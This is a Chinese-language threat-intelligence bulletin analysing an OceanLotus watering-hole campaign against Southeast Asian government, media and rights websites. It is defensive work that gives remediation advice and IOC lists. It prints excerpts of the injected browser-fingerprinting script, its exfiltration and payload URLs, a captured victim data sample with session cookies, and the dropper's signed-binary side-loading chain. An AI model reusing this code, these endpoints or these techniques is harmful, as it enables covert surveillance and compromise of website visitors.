> 原文链接: https://www.anquanke.com//post/id/87193 


# 【APT报告】海莲花（OceanLotus）APT团伙新活动通告（11月10日更新）


                                阅读量   
                                **191037**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t010b6b64a957478631.png)](https://p2.ssl.qhimg.com/t010b6b64a957478631.png)

**作者：360威胁情报中心 &amp;&amp; 360CERT**



**文档信息**

****

****[![](https://p0.ssl.qhimg.com/t01c4f46b3bb8d64f86.png)](https://p0.ssl.qhimg.com/t01c4f46b3bb8d64f86.png)

 

**通告背景**

****

2017 年 11 月 6 日，国外安全公司发布了一篇据称海莲花 APT 团伙新活动的报告，360 威胁情报中心对其进行了分析和影响面评估，提供处置建议。

<br>

**事件概要**

****

****[![](https://p2.ssl.qhimg.com/t0123bf9bbfeef32c3b.png)](https://p2.ssl.qhimg.com/t0123bf9bbfeef32c3b.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d5a2ab36ef13f361.png)



**事件描述**

****

2017年11月6日，国外安全公司Volexity发布了一篇关于疑似海莲花APT团伙新活动的报告，该报告指出攻击团伙攻击了与政府、军事、人权、媒体和国家石油勘探等有关的个人和组织的100多个网站。通过针对性的JavaScript脚本进行信息收集，修改网页视图，配合社会工程学诱导受害人点击安装恶意软件或者登陆钓鱼页面，以进行下一步的攻击渗透。

<br>

**事件时间线**

****

2017 年 11 月 6 日 Volexity 公司发布了据称海莲花新活动的报告。 

2017 年 11 月 7 日 360 威胁情报中心发现确认部分攻击并作出响应。

<br>

**影响面和危害分析**

****



攻击者团伙入侵目标用户可能访问的网站，不仅破坏网站的安全性，还会收集所访问用户的系统信息。如果确认感兴趣的目标，则会执行进一步的钓鱼攻击获取敏感账号信息或尝试植入恶意程序进行秘密控制。

基于360网络研究院的数据，访问过攻击者设置的信息收集恶意站点有可能被获取自身主机信息的用户数量在十万级别，造成较大的敏感信息泄露，而这些用户中的极少数被诱骗下载执行恶意代码从而植入后门。

目前360威胁情报中心确认部分网站受到了影响，**建议用户，特别是政府及大型企业结合附件提供的IOC信息对自身系统进行检查处理。**

<br>

**处置建议**

****

1. 网站管理员检查自己网站页面是否被植入了恶意链接，如发现，清理被控制的网站中嵌 入的恶意代码，并排查内部网络的用户是否被植入了恶意程序。 

2. 电脑安装防病毒安全软件，确认规则升级到最新。

<br>

**技术分析**

****

**JavaScript分析**

**执行步骤**

攻击者通过水坑攻击将恶意JavaScript代码植入到合法网站，收集用户浏览器指纹信息，修改网页视图诱骗用户登陆钓鱼页面、安装下载恶意软件。

大致的执行步骤是首先JavaScript脚本根据基础信息，引用到指定版本的恶意jQuery JavaScript文件进一步收集信息后获取新的JavaScript Payload。此Payload是大量的基础的函数以及更详尽的设备信息收集，同时还通过WebRTC获得真实IP地址。发送信息到通信地址加载新的 JavaScript Payload，此Payload进一步信息收集或者产生后续攻击变换。

**探针一**

**http://45.32.105.45/ajax/libs/jquery/2.1.3/jquery.min.js?s=1&amp;v=86462**

jquery的最下面有个eval

[![](https://p5.ssl.qhimg.com/t010f0bf592a7c1d0a6.png)](https://p5.ssl.qhimg.com/t010f0bf592a7c1d0a6.png)

核心获取传输数据部分如下：

```
var browser_hash = 'b0da8bd67938a5cf22e0-37cea33014-iGJHVcEXbp';
var data = `{` 'browserhash': browserhash, 'type': 'Extended Browser Info', 'action': 'replace', 'name': 'WebRTC', 'value': array2json(window.listIP).replace(/"/g, '"'), 'log': 'Receiced WebRTC data from client `{`client`}`.' `}`; 
var data = `{` 'browserhash': browserhash, 'type': 'Extended Browser Info', 'name': 'Browser Plugins', 'action': 'replace', 'value': array2json(plugins).replace(/"/g, '"'), 'log': 'Receiced Browser Plugins data from client `{`client`}`.' `}`; 
var info = `{` 'Screen': screen.width + ' x ' + screen.height, 'Window Size': window.outerWidth + ' x ' + window.outerHeight, 'Language': navigator.language, 'Cookie
Enabled': (navigator.cookieEnabled) ? 'Yes' : 'No', 'Java Enabled': (navigator.javaEnabled()) ? 'Yes' : 'No' `}`; 
var data = `{` 'browserhash': browserhash, 'type': 'Extended Browser Info', 'name': 'Extended Browser Info', 'action': 'replace', 'value': array2json(info).replace(/"/g, '"'), 'log': 'Receiced Extended Browser Info data from client `{`client`}`.' `}`;
```

**探针二**

获取数据部分，用于字符串处理，校对时区，收集swf、express、activex、flash以及插入swf

[![](https://p1.ssl.qhimg.com/t017d4d5e78c7ce15a3.png)](https://p1.ssl.qhimg.com/t017d4d5e78c7ce15a3.png)

传送数据相关的代码

[![](https://p0.ssl.qhimg.com/t015a9c2f9c981e2c2b.png)](https://p0.ssl.qhimg.com/t015a9c2f9c981e2c2b.png)

发送的内容如下

```
'`{`"history":`{`"client_title":"",
"client_url":"https://www.google.co.kr/_/chrome/newtab?espv=2&amp;ie=UTF-8",
"client_cookie":"SID=TQUtor57TAERNu6GqnR4pjxikT_fUFRYJg0WDuQR6DLPYP79ng8b20xLV45BALRr9EP0ig.; 
APISID=czIiWPC84XzsPhi7/AEXqM7jJZBOCVK4NB; 
SAPISID=EukztCzcUbvlcTe3/A0h8Z8oQR86VGPTf_; 
UULE=a+cm9sZToxIHByb2R1Y2VyOjEyIHByb3ZlbmFuY2U6NiB0aW1lc3RhbXA6MTUxMDA1Mzg3NDY1OTAwMCBsYXRsbmd7bGF0aXR1ZGVfZTc6Mzk5ODE5MzY5IGxvbmdpdHVkZV9lNzoxMTY0ODQ5ODQ5fSByYWRpdXM6MzM0ODA=; 
1P_JAR=2017-11-8-2",
"client_hash":"",
"client_referrer":"",
"client_platform_ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"client_time":"2017-11-08T03:40:25.641Z",
"client_network_ip_list":["10.17.52.196"],
"timezone":"Asia/Shanghai"`}``}`'
```



**数据传输地址**

****

**探针一**

接受数据 **//45.32.105.45/icon.jpg?v=86462&amp;d=`{`data`}` **

根据参数下发 

**payload //45.32.105.45/ajax/libs/jquery/2.1.3/jquery.min.js?&amp;v=86462&amp;h1=`{`data`}`&amp;h2=`{`data`}`&amp;r=`{`data`}`**

**探针二**

往以下地址 POST 数据,并接受新的 js 并运行**//ad.jqueryclick.com/117efea9-be70-54f2-9336-893c5a0defa1**

<br>

**信息收集列表**

****

浏览器中执行的恶意代码会收集如下这些信息：

****

**浏览器类型**

**浏览器版本**

**浏览器分辨率、DPI**

**CPU类型**

**CPU核心数**

**设备分辨率**

**BuildID**

**系统语言**

**jsHeapSizeLimit**

**screen.colorDepth**

**是否开启Cookie**

**是否开启Java**

**已经加载的插件列表**

**Referrer**

**当前网络IP**

**Cookie**



**定向投递**



完成信息收集之后，攻击者会通过一个白名单过滤感兴趣的用户，如果不是仅仅返回一个时间戳，是则下发相应的JavaScript Payload，执行以下功能：

**以钓鱼的方式骗取攻击目标的Google账号信息**

**欺骗用户安装或更新捆绑了恶意代码的浏览器软件（已知的有IE、Chrome及Firefox）**

以下两个Amazon相关的域名用于存放假浏览器软件（该地址也可用于鱼叉链接）

**dload01.s3.amazonaws.com**

**download-attachments.s3.amazonaws.com**

<br>

**二进制样本分析**

****

**Dorpper**

通过关联分析，360威胁情报中心定位到一个相关的恶意样本（ MD5：**eb2b52ed27346962c4b7b26df51ebafa **）。

样本是一个捆绑了Firefox浏览器的Dropper：

[![](https://p3.ssl.qhimg.com/t01ef32be8a83af5781.png)](https://p3.ssl.qhimg.com/t01ef32be8a83af5781.png)                 

[![](https://p1.ssl.qhimg.com/t01e654048654280965.png)](https://p1.ssl.qhimg.com/t01e654048654280965.png)                               

该Dropper中有一个Name为1的大资源：

[![](https://p4.ssl.qhimg.com/t0167402144a132a730.png)](https://p4.ssl.qhimg.com/t0167402144a132a730.png)

该资源是加密的，经过调试分析得到解密后的数据如下：

[![](https://p1.ssl.qhimg.com/t01e6a035e25c0bc374.png)](https://p1.ssl.qhimg.com/t01e6a035e25c0bc374.png)



数据结构如下图所示：

[![](https://p4.ssl.qhimg.com/t019cbcaf29d2cc9630.png)](https://p4.ssl.qhimg.com/t019cbcaf29d2cc9630.png)

经过分析发现该资源数据的数据结构如下：

[![](https://p1.ssl.qhimg.com/t013da2734013763159.png)](https://p1.ssl.qhimg.com/t013da2734013763159.png)



如下为解密后的Firefox文件（7zS.sfx.exe）和具备自删除功能的程序文件（123.exe）：

[![](https://p3.ssl.qhimg.com/t01565c2abcc9f5bbfc.png)](https://p3.ssl.qhimg.com/t01565c2abcc9f5bbfc.png)

正常的Firefox安装截图如下：

[![](https://p4.ssl.qhimg.com/t01749fdb309b7011d1.png)](https://p4.ssl.qhimg.com/t01749fdb309b7011d1.png)

执行正常的Firefox后，会先申请一个5个字节的内存空间，用于存放跳转指令，还会再申请一个内存空间存放资源数据中“第一部分代码”的地方，然后计算相对偏移，修改相对地址，跳转过去执行shellcode：

[![](https://p1.ssl.qhimg.com/t01fb2a110576366b09.png)](https://p1.ssl.qhimg.com/t01fb2a110576366b09.png)

下图为修正的5个字节的跳转的数据：<br>

[![](https://p0.ssl.qhimg.com/t01bd9a097f7877d25b.png)](https://p0.ssl.qhimg.com/t01bd9a097f7877d25b.png)

下图为跳转后的shellcode的入口处，代码里插入了花指令：

[![](https://p3.ssl.qhimg.com/t01d68b0f3e499a70f3.png)](https://p3.ssl.qhimg.com/t01d68b0f3e499a70f3.png)

[![](https://p2.ssl.qhimg.com/t016ed1319aa2fefe4b.png)](https://p2.ssl.qhimg.com/t016ed1319aa2fefe4b.png)

[![](https://p4.ssl.qhimg.com/t01ddf21c99b607532e.png)](https://p4.ssl.qhimg.com/t01ddf21c99b607532e.png)

Shellcode会从自身提取出来修正前的PE文件的内容，修正后复制到目标内存中，并在内存中执行起来，下图为把复制数据的操作：

[![](https://p4.ssl.qhimg.com/t0162ddb73ad026ccaa.png)](https://p4.ssl.qhimg.com/t0162ddb73ad026ccaa.png)

下图为复制修正后的PE头数据：

[![](https://p3.ssl.qhimg.com/t016cef6a82549bcdeb.png)](https://p3.ssl.qhimg.com/t016cef6a82549bcdeb.png)

Dump出的PE基本信息如下，

导出模块名为：`{`103004A5-829C-418E-ACE9-A7615D30E125`}`.dll：

[![](https://p5.ssl.qhimg.com/t017d72df9126363cb1.png)](https://p5.ssl.qhimg.com/t017d72df9126363cb1.png)

Dump出的PE（DLL形式的Dropper）中也有一个名为1的资源：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010bf1b7d20c7a22ab.png)

资源的大小为1079KB：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0129047aead90f0d3b.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bf501a3a1d4e547f.png)

该资源数据使用DES加密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b066e5cfbdfdd9b6.png)



解密后的数据为拼接到一起的3个文件：**rastlsc.exe、rastls.dll和sylog.bin**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b66cc3b4079b2108.png)

释放的3个文件为典型的白利用过杀软方式，rastlsc.exe文件带有Symantec的签名，此白文件会加载同目录下的rastls.dll，该dll会去解密加载sylog.bin文件并执行：

[![](https://p3.ssl.qhimg.com/t01312f5d49370d9556.png)](https://p3.ssl.qhimg.com/t01312f5d49370d9556.png)

Dropper执行shellcode后，会把执行自删除功能的文件释放到temp目录的123.exe，把正常的浏览器文件替换掉Dropper后，以Dropper的路径作为参数运行123.exe：

[![](https://p4.ssl.qhimg.com/t01776e83100f4fd052.png)](https://p4.ssl.qhimg.com/t01776e83100f4fd052.png)

123.exe的功能主要是睡眠一秒后删除命令行传过来的文件，攻击者不通过调用cmd.exe的方式删除自己，估计是为了免杀。

[![](https://p5.ssl.qhimg.com/t012b666c88dce6b702.png)](https://p5.ssl.qhimg.com/t012b666c88dce6b702.png)

<br>

**恶意功能代码**

****

sylog.bin文件在内存中解析后被执行，代码会获取计算机信息生成字符串与 .harinarach.com、.maerferd.com和 .eoneorbin.com拼接成一个完整的域名，连接其25123端口：

[![](https://p0.ssl.qhimg.com/t015c63439d12ea1ee7.png)](https://p0.ssl.qhimg.com/t015c63439d12ea1ee7.png)

[![](https://p4.ssl.qhimg.com/t0130ba6f22a73c8289.png)](https://p4.ssl.qhimg.com/t0130ba6f22a73c8289.png)

[![](https://p1.ssl.qhimg.com/t0105fe9876ee80ca3a.png)](https://p1.ssl.qhimg.com/t0105fe9876ee80ca3a.png)

成功连接后可以执行如下远控功能：

**1、 文件管理**

**2、 远程shell**

**3、 注册表管理**

**4、 进程管理**

关于远控部分的其他细节，360威胁情报中心将会在后续给出更详细的分析。

<br>

**总体流程图**

****

综合上述分析，样本执行流程总结如下：

[![](https://p4.ssl.qhimg.com/t01d49806241f471629.png)](https://p4.ssl.qhimg.com/t01d49806241f471629.png)



**关联分析及溯源**

****

360威胁情报中心尝试通过分发JavaScript的恶意域名的WHOIS信息来对本次事件做一些关联分析，一共38个域名，基本上都使用了隐私保护，注册时间则分布于2014年3月至2017年 10月，可见攻击团伙的活动时间之长准备之充分。如下是其中一个域名的注册信息： [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aa24effe90567c93.png)

从攻击团伙用于C&amp;C通信的域名dload01.s3.amazonaws.com出发，360威胁情报中心发现一个捆绑恶意代码的Firefox浏览器更新文件，该文件就是技术分析部分提到的恶意样本。同时360威胁情报中心还发现了更多的恶意代码，包括Cobalt Strike生成的Powershell代码以及捆绑在其他浏览器中的恶意样本，这也是海莲花团伙的惯用手法之一，后续360威胁情报中心可能会发布更多相关的恶意代码分析。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f8b5a5f8988e64ae.png)



**参考资料**

****

[https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance -and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/](https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance%20-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/)



**更新历史**

****

****

****

[![](https://p4.ssl.qhimg.com/t01217263a652012907.png)](https://p4.ssl.qhimg.com/t01217263a652012907.png)

**附件**

****

**IOC列表**











**C&amp;C服务器**

dload01.s3.amazonaws.com

download-attachments.s3.amazonaws.com

maerferd.com

harinarach.com

eoneorbin.com

http://dload01.s3.amazonaws.com/b89fdbf4-9f80-11e7-abc4-2209cec278b6b50a/FirefoxInstaller.exe 

**分发JavaScript的恶意域名**

a.doulbeclick.org

ad.adthis.org

ad.jqueryclick.com

ad.linksys-analytic.com

ads.alternativeads.net

api.2nd-weibo.com

api.analyticsearch.org

api.baiduusercontent.com

api.disquscore.com

api.fbconnect.net

api.querycore.com

browser-extension.jdfkmiabjpfjacifcmihfdjhpnjpiick.com

cache.akamaihd-d.com

cdn-js.com

cdn.adsfly.co

cdn.disqusapi.com

cloud.corewidget.com

cloudflare-api.com

core.alternativeads.net

cory.ns.webjzcnd.com

d3.advertisingbaidu.com

eclick.analyticsearch.org

google-js.net

google-js.org

google-script.net

googlescripts.com

gs.baidustats.com

health-ray-id.com

hit.asmung.net

jquery.google-script.org

js.ecommer.org

linked.livestreamanalytic.com

linksys-analytic.com

live.webfontupdate.com

s.jscore-group.com

s1.gridsumcontent.com

s1.jqueryclick.com

ssl.security.akamaihd-d.com

stat.cdnanalytic.com

static.livestreamanalytic.com

stats.corewidget.com

stats.widgetapi.com

track-google.com

update.akamaihd-d.com

update.security.akamaihd-d.com

update.webfontupdate.com

upgrade.liveupdateplugins.com

widget.jscore-group.com

wiget.adsfly.co

www.googleuserscontent.org

**曾经被插入过恶意JavaScript的正常网站/URL**

anninhdothi.com

asean.org

atr.asean.org

bacaytruc.com

baocalitoday.com

baotiengdan.com

baovesusong.net

basamnews.info

bdstarlbs.com

bokeo.gov.la

boxitvn.blogspot.com

boxitvn.blogspot.de

boxitvn.blogspot.ro

bshohai.blogspot.com

chanlyonline.com

chatluongvn.tk

chuongtrinhchuyende.com

damau.org

danchimviet.info

dannews.info

ddsvvn.blogspot.com

delivery.adnetwork.vn

demo.mcs.gov.kh

doanhuulong.blogspot.de

ethongluan.org

ethongluan01.blogspot.be

ethongluan01.blogspot.com

frphamlong.blogspot.com

gwhs.i.gov.ph

hongbagai.blogspot.com

hopluu.net

icevn.org

investasean.asean.org

khmerangkor-news.com

laoedaily.com.la

m.baomoi.com

m.suckhoedoisong.vn

machsongmedia.com

mail.dnd.gov.ph

mail.vms.com.vn

mcs.gov.kh

mlobkhmer-news.com

monasri.gov.kh

nationalrescueparty.org

nguoivietboston.com

niptict.edu.kh

nsvancung.com

ntuongthuy.blogspot.com

op-proper.gov.ph

phamnguyentruong.blogspot.com

phiatruoc.info

phongkhamdakhoadanang.com

police.gov.kh

pttpgqt.org

quanvan.net

quyenduocbiet.com

radiodlsn.com

sensoknews.com

sihanoukville.gov.kh

son-trung.blogspot.com

son-trung.blogspot.com.au

suckhoedoisong.vn

tag.gammaplatform.com

tandaiviet.org

thanglongcompany.com

thanhlinh.net

thanhnienconggiao.blogspot.com

thanhnienconggiao.blogspot.com.au

thewenews.com

thsedessapientiae.net

thuvienhoasen.org

thuymyrfi.blogspot.com

thuymyrfi.blogspot.fr

tiengnoividan.blogspot.com

tiengnoividan.blogspot.com.au

tinkhongle.blogspot.com

tinparis.net

truongduynhat.org

truyenhinhcalitoday.com

ukk-news.com

v-card.vn

veto-network.org

vietcatholic.net

vietcatholic.org

vietchonhau.blogspot.co.uk

vietchonhau.blogspot.com

vietfact.com

vnwhr.net

vuhuyduc.blogspot.com

www.afp.mil.ph

www.atgt.vn

www.attapeu.gov.la

www.bacaytruc.com

www.baocalitoday.com

www.baogiaothong.vn

www.baomoi.com

www.baotgm.com

www.blogger.com

www.cdnvqglbhk.org

www.chanlyonline.com

www.clip6s.com

www.cnpc.com.cn

www.cnrp7.org

www.cpp.org.kh

www.damau.info

www.damau.org

www.danchimviet.info

www.diendantheky.net

www.ethongluan.org

www.fia.gov.kh

www.firstcagayan.com

www.icevn.org

www.ijavn.org

www.khmer-note.com

www.khmer-press.com

www.kimlimshop.com

www.kntnews.com

www.leanhhung.com

www.lyhuong.net

www.machsongmedia.com

www.mcs.gov.kh

www.monasri.gov.kh

www.moneaksekar.com

www.mosvy.gov.kh

www.nationalrescueparty.org

www.ndanghung.com

www.necelect.org.kh

www.nguoi-viet.com

www.nguoitieudung.com.vn

www.pac.edu.kh

www.phapluatgiaothong.vn

www.phnompenhpost.com

www.police.gov.kh

www.preynokornews.today

www.quyenduocbiet.com

www.radiodlsn.com

www.siamovies.vn

www.tapchigiaothong.vn

www.tapchinhanquyen.com

www.thanhnientphcm.com

www.tienbo.org

www.tinnhanhne.net

www.trinhanmedia.com

www.tuvanonecoin.net

www.vande.org

www.vietcatholic.net

www.vietnamhumanrightsdefenders.net

www.vietnamthoibao.org

www.vietnamvanhien.net

www.vietthuc.org

xuandienhannom.blogspot.com

xuandienhannom.blogspot.com.au

http://asean.org/modules/aseanmail/js/wp-mailinglist.js

http://asean.org/modules/wordpress-popup/inc/external/wpmu-lib/js/wpmu-ui.3.min.js

http://atr.asean.org/

http://investasean.asean.org/

http://www.afp.mil.ph/modules/mod_js_flexslider/assets/js/jquery.easing.js

http://www.mfa.gov.kh/jwplayer.js

http://www.moe.gov.kh/other/js/jquery/jquery.js

http://www.monasri.gov.kh/wtemplates/monasri_template/js/menu/mega.js

http://www.mosvy.gov.kh/public/js/default.js

http://www.mpwt.gov.la/media/system/js/mootools-core.js

http://www.police.gov.kh/wp-includes/js/jquery/jquery.js
